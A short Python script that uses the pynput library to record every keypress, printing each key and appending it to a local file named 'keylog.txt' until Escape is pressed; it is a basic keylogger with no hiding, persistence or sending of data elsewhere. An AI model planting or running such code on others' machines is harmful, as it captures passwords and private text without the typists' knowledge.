from pynput.keyboard import Key, Listener

def on_press(key):
    fp=open("keylog.txt","a")
    print(key)
    fp.write(str(key)+"\n")
    fp.close()
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()
